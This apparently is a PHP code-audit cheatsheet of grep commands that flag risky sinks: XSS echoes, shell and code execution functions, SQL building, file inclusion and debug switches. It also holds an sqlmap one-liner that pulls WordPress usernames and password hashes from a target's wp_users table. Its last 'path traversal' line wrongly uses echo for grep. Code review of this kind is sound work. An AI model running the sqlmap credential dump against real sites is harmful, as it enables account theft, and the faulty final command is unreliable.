# Cheatsheet for finding vulnerable PHP code using grep

This will assist you in the finding of potentially vulnerable PHP code. Each type of grep command is categorized in the type of vulnerabilities you generally find with that function.

*Some of this came from a source long forgotten. If you know the source of the original sheet please let me know so I may add credit where due.*

follow me: [@dustyfresh](https://twitter.com/dustyfresh) | website: http://atxsec.com

#### XSS:
grep -i -r "echo" *
grep -i -r "\$_GET" *
grep -i -r "\$_" * | grep "echo"
grep -i -r "\$_GET" * | grep "echo"
grep -i -r "\$_POST" * | grep "echo"
grep -i -r "\$_REQUEST" * | grep "echo"

#### Command execution:
grep -i -r "shell_exec(" *
grep -i -r "system(" *
grep -i -r "exec(" *
grep -i -r "popen(" *
grep -i -r "passthru(" *
grep -i -r "proc_open(" *
grep -i -r "pcntl_exec(" *

#### Code execution:
grep -i -r "eval(" *
grep -i -r "assert(" *
grep -i -r "preg_replace" * | grep "/e"
grep -i -r "create_function(" *

#### SQL Injection:
grep -i -r "\$sql" *
grep -i -r "\$sql" * | grep "\$_"

#### SQLMAP CHEATSHEET:
[Wordpress]
sqlmap -u "http://target.tld/?paramater=1" -p "parameter" --technique=B --dbms=mysql --suffix=")--" --string="Test" --sql-query="select user_login,user_pass from wp_users"

#### Information leak via phpinfo:
grep -i -r "phpinfo" *

#### Find dev and debug modes:
grep -i -r "debug" *
grep -i -r "\$_GET['debug']" *
grep -i -r "\$_GET['test']" *

#### RFI/LFI:
grep -i -r "file_include" *
grep -i -r "include(" *
grep -i -r "require(" *
grep -i -r "require(\$file)" *
grep -i -r "include_once(" *
grep -i -r "require_once(" *
grep -i -r "require_once(" * | grep "\$_"

#### Misc:
grep -i -r "header(" * | grep "\$_"
grep -i -r '$_SERVER["HTTP_USER_AGENT"]' *

#### Path Traversal:
echo -i -r file_get_contents *
